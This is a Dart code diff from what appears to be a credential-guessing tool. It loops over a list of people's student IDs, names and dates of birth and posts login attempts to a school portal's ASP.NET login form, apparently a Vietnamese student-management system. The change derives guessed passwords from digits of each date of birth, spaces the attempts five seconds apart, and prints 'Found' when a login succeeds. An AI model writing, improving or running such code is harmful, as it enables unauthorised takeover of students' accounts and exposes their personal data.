@@ -10,35 +10,18 @@ abstract class CheckAccount {
   static Future<void> checkAccount(List<Account> accounts) async {
     for (var account in accounts) {
       await Future.delayed(const Duration(seconds: 5));
-      _checkAccount(account).then((value) => {
-            if (value)
-              {
-                print('-----------------'),
-                print("******* Found ******"),
-                print(account.dob),
-                print(account.mssv),
-                print(account.name),
-                print('-----------------')
-              }
-            else
-              {
-                print('-----------------'),
-                print("******* Wrong ******"),
-                print(account.dob),
-                print(account.mssv),
-                print(account.name),
-                print('-----------------')
-              }
-          });
+      _checkAccount(account);
     }
   }
 
   static Future<bool> _checkAccount(Account account) async {
+    String password =
+        '${account.dob.replaceAll("-", "").substring(0, 3)}${account.dob.replaceAll("-", "").substring(6, 7)}';
     var response = await _dio.post(_loginURL,
         data: FormData.fromMap({
           "__VIEWSTATE": _viewState,
           "_ctl0:MainContent:QLTH_btnLogin": _method,
-          "_ctl0:MainContent:DN_txtPass": account.dob.replaceAll("-", ""),
+          "_ctl0:MainContent:DN_txtPass": password,
           "_ctl0:MainContent:DN_txtAcc": account.mssv,
         }),
         options: Options(
@@ -50,8 +33,20 @@ abstract class CheckAccount {
     if (response.data
         .toString()
         .contains('<html><head><title>Object moved</title></head><body>')) {
+      print('-----------------');
+      print("******* Found ******");
+      print(account.dob);
+      print(account.mssv);
+      print(account.name);
+      print('-----------------');
       return true;
     }
+    print('-----------------');
+    print("******* Wrong ******");
+    print(account.dob);
+    print(account.mssv);
+    print(account.name);
+    print('-----------------');
     return false;
   }
 }
